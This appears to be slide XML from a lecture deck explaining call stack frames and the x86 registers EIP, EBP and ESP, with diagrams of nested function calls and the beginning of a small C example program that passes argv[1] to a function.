            <a:chOff x="3945498" y="2692169"/>
            <a:chExt cx="1516551" cy="1824693"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="12" name="Rectangle 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3945498" y="3727805"/>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A’s Stack Frame</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="13" name="Rectangle 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3945498" y="3209987"/>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B’s Stack Frame</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="14" name="Rectangle 13"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3945498" y="2692169"/>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C’s Stack Frame</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="34" name="Rectangle 33"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3945498" y="4245623"/>
              <a:ext cx="1516551" cy="27123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t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 40"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6378890" y="2679840"/>
            <a:ext cx="1516551" cy="1824693"/>
            <a:chOff x="6378890" y="2679840"/>
            <a:chExt cx="1516551" cy="1824693"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="15" name="Rectangle 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6378890" y="3715476"/>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A’s Stack Frame</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="16" name="Rectangle 15"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6378890" y="3197658"/>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B’s Stack Frame</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="17" name="Rectangle 16"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6378890" y="2679840"/>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D’s Stack Frame</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="35" name="Rectangle 34"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6378890" y="4233294"/>
              <a:ext cx="1516551" cy="27123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t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="42" name="Group 41"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3920838" y="5025942"/>
            <a:ext cx="1516551" cy="1306875"/>
            <a:chOff x="3920838" y="5025942"/>
            <a:chExt cx="1516551" cy="1306875"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="18" name="Rectangle 17"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3920838" y="5543760"/>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A’s Stack Frame</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="19" name="Rectangle 18"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3920838" y="5025942"/>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B’s Stack Frame</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="36" name="Rectangle 35"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3920838" y="6061578"/>
              <a:ext cx="1516551" cy="27123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t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="43" name="Group 42"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6189504" y="5087587"/>
            <a:ext cx="1888295" cy="1195914"/>
            <a:chOff x="6189504" y="5087587"/>
            <a:chExt cx="1888295" cy="1195914"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="20" name="Rectangle 19"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6341900" y="5506773"/>
              <a:ext cx="1516551" cy="517818"/>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A’s Stack Frame</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="37" name="Rectangle 36"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6341900" y="6012262"/>
              <a:ext cx="1516551" cy="27123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t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="38" name="TextBox 37"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6189504" y="5087587"/>
              <a:ext cx="1888295" cy="369332"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0"/>
                <a:t>Returned from B()</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Slide Number Placeholder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>13</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4285227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586936" cy="614637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Important Registers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Content Placeholder 5" descr="cpu.gif"/>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect l="18986" r="18986"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5994133" y="0"/>
            <a:ext cx="2692667" cy="3083188"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="912346"/>
            <a:ext cx="4893882" cy="2367164"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>EIP: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>the next address of current executed instruction (what is the next instruction the CPU needs to execute next?)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>EBP: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>the address for the bottom of the current stack frame</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>ESP: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>the address for the top of the current stack frame</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1442570" y="4006922"/>
            <a:ext cx="1664507" cy="2095928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6">
              <a:lumMod val="60000"/>
              <a:lumOff val="40000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr kumimoji="1" lang="en-US" sz="1600">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" charset="0"/>
              <a:ea typeface="新細明體" charset="0"/>
              <a:cs typeface="新細明體" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="9" name="Straight Connector 8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1442570" y="4389120"/>
            <a:ext cx="1664507"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0" name="Straight Connector 9"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1442570" y="4644604"/>
            <a:ext cx="1664507"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1442570" y="4895636"/>
            <a:ext cx="1664507"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p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1442570" y="5183654"/>
            <a:ext cx="1664507"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4" name="Straight Arrow Connector 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1072682" y="4512410"/>
            <a:ext cx="369888"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1539" y="4270283"/>
            <a:ext cx="641143" cy="2880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CPU</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rounded Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="432540" y="4632275"/>
            <a:ext cx="641143" cy="2510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EIP</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="17" name="Straight Arrow Connector 16"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="16" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1073683" y="4757791"/>
            <a:ext cx="36888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56502" y="6171684"/>
            <a:ext cx="595035" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>Text</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="23" name="Group 22"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4825349" y="3821987"/>
            <a:ext cx="1516551" cy="2242679"/>
            <a:chOff x="6341900" y="-18522"/>
            <a:chExt cx="1516551" cy="2242679"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="24" name="Rectangle 23"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6341900" y="1042799"/>
              <a:ext cx="1516551" cy="91012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A’s Stack Frame</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="25" name="Rectangle 24"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6341900" y="-18522"/>
              <a:ext cx="1516551" cy="106132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B’s Stack Frame</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr kumimoji="1" lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="26" name="Rectangle 25"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6341900" y="1952918"/>
              <a:ext cx="1516551" cy="27123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solidFill>
                    <a:schemeClr val="accent2"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" charset="0"/>
                  <a:ea typeface="新細明體" charset="0"/>
                  <a:cs typeface="新細明體" charset="0"/>
                </a:rPr>
                <a:t>…..</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Curved Up Arrow 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4956530" y="2601417"/>
            <a:ext cx="3230375" cy="678093"/>
          </a:xfrm>
          <a:prstGeom prst="curved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8" name="Rounded Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6970714" y="3788939"/>
            <a:ext cx="641143" cy="2880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ESP</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rounded Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6970714" y="4619946"/>
            <a:ext cx="641143" cy="2880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EBP</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="30" name="Straight Arrow Connector 29"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6341900" y="3920619"/>
            <a:ext cx="6288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H="1">
            <a:off x="6341900" y="4799231"/>
            <a:ext cx="6288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35" name="Group 34"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4825349" y="4450764"/>
            <a:ext cx="2103937" cy="1220571"/>
            <a:chOff x="4825349" y="4450764"/>
            <a:chExt cx="2103937" cy="1220571"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="33" name="Rectangle 32"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4825349" y="4450764"/>
              <a:ext cx="1516551" cy="27003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a:r>
                <a:rPr kumimoji="1" lang="en-US" sz="1600" dirty="0">
                  <a:latin typeface="Times New Roman" charset="0"/>
                  <a:ea typeface="新細明體" charset="0"/>
                  <a:cs typeface="新細明體" charset="0"/>
                </a:rPr>
                <a:t>A’s EBP Value</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="34" name="Freeform 33"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6349786" y="4561726"/>
              <a:ext cx="579500" cy="1109609"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="connsiteX0" fmla="*/ 0 w 579500"/>
                <a:gd name="connsiteY0" fmla="*/ 0 h 1109609"/>
                <a:gd name="connsiteX1" fmla="*/ 579495 w 579500"/>
                <a:gd name="connsiteY1" fmla="*/ 517817 h 1109609"/>
                <a:gd name="connsiteX2" fmla="*/ 12330 w 579500"/>
                <a:gd name="connsiteY2" fmla="*/ 1109609 h 1109609"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="0">
                  <a:pos x="connsiteX0" y="connsiteY0"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="connsiteX1" y="connsiteY1"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="connsiteX2" y="connsiteY2"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="579500" h="1109609">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="288720" y="166441"/>
                    <a:pt x="577440" y="332882"/>
                    <a:pt x="579495" y="517817"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="581550" y="702752"/>
                    <a:pt x="12330" y="1109609"/>
                    <a:pt x="12330" y="1109609"/>
                  </a:cubicBezTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln>
              <a:tailEnd type="triangle" w="lg" len="lg"/>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grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5289432" y="6171684"/>
            <a:ext cx="697627" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>Stack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>14</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="88625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 name="Rectangle 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6789773" y="1280557"/>
            <a:ext cx="2161576" cy="4760647"/>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3037106" y="1280557"/>
            <a:ext cx="3491434" cy="4760647"/>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97862" y="1280557"/>
            <a:ext cx="2602338" cy="4760647"/>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An Example</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="97862" y="1740803"/>
            <a:ext cx="2602338" cy="3754874"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>#include &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>string.h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0">
              <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
              <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
              <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>int</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> main (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>int</a:t>
            </a:r>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argc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>, char **</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>argv</a:t>
            </a:r>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printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(“%s”, “CEG”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>   foo(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>argv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>[1]);</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printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(“%s”, “7900”)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0">
              <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
              <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
              <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0">
              <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
              <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
              <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0">
              <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
              <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
              <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
